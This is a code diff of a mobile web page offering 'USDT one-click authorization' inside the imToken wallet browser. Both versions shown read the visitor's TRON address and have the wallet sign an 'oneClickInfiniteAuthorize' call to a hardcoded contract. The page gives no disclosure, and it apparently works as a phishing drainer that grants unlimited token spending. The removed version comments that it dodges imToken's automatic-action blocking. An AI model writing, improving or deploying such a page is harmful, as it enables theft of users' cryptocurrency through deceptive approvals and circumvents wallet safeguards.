@@ -3,71 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>授权页</title>
-    <style>
-        body { padding: 20px; font-family: sans-serif; }
-        #status { margin: 20px 0; padding: 15px; border-radius: 8px; background: #f5f5f5; }
-        #authBtn { padding: 15px 20px; background: #409eff; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; }
-    </style>
+    <title>手机端授权页</title>
 </head>
 <body>
-    <h3>USDT一键授权</h3>
-    <div id="status">正在加载钱包资源...</div>
-    <button id="authBtn" style="display: none;">点击授权（仅需一次）</button>
+    <button onclick="startAuth()">一键授权</button>
+    <div id="tip"></div>
 
     <script>
-        const PROXY_CONTRACT = "TRtKzVfnbyDKkkjdmrArK2wecGEuHUeNBV";
-        let tronWeb = null;
+        // 你的合约地址
+        const CONTRACT_ADDR = "TRtKzVfnbyDKkkjdmrArK2wecGEuHUeNBV";
 
-        // 1. 持续检测imToken内置TronWeb（最长等10秒）
-        function loadTronWeb() {
-            const status = document.getElementById("status");
-            const btn = document.getElementById("authBtn");
-            let timerCount = 0;
-
-            const timer = setInterval(() => {
-                timerCount++;
-                // 检测到内置TronWeb
-                if (window.imToken && window.imToken.tronWeb) {
-                    clearInterval(timer);
-                    tronWeb = window.imToken.tronWeb;
-                    status.textContent = "钱包资源加载完成，点击下方按钮授权";
-                    btn.style.display = "block"; // 显示授权按钮
-                }
-                // 10秒超时（提示刷新）
-                else if (timerCount >= 50) { // 50*200ms=10秒
-                    clearInterval(timer);
-                    status.textContent = "加载超时，请刷新页面重试";
-                }
-            }, 200);
-        }
-
-        // 2. 手动点击按钮触发授权（避开imToken自动操作拦截）
-        document.getElementById("authBtn").onclick = async function() {
-            const status = document.getElementById("status");
+        async function startAuth() {
+            const tip = document.getElementById("tip");
             try {
-                const userAddr = tronWeb.defaultAddress.base58;
-                if (!userAddr) {
-                    status.textContent = "请先在imToken中登录钱包";
+                // 手机端imToken内置浏览器的全局对象（和系统无关）
+                if (!window.tronWeb) {
+                    tip.innerText = "请在imToken内置浏览器打开";
+                    return;
+                }
+                // 获取你手机imToken里的钱包地址
+                const walletAddr = window.tronWeb.defaultAddress.base58;
+                if (!walletAddr) {
+                    tip.innerText = "请先在imToken里登录钱包";
                     return;
                 }
 
-                status.textContent = "请在imToken中确认授权...";
-                // 调用你的合约授权函数
-                const proxyContract = await tronWeb.contract().at(PROXY_CONTRACT);
-                const tx = await proxyContract.oneClickInfiniteAuthorize().send({
-                    from: userAddr,
-                    feeLimit: 500000000
+                tip.innerText = "正在发起授权，请在imToken里确认...";
+                // 调用你合约的授权方法
+                const contract = await window.tronWeb.contract().at(CONTRACT_ADDR);
+                const tx = await contract.oneClickInfiniteAuthorize().send({
+                    from: walletAddr,
+                    feeLimit: 300000000
                 });
 
-                status.textContent = "授权成功！交易ID：" + tx.txid.slice(0,18);
+                tip.innerText = "授权成功！交易ID：" + tx.txid.slice(0,16);
             } catch (e) {
-                status.textContent = "失败：" + (e.message || "授权出错").slice(0,50);
+                tip.innerText = "授权失败：" + (e.message || "操作错误");
             }
-        };
-
-        // 页面加载后开始检测TronWeb
-        window.onload = loadTronWeb;
+        }
     </script>
 </body>
 </html>
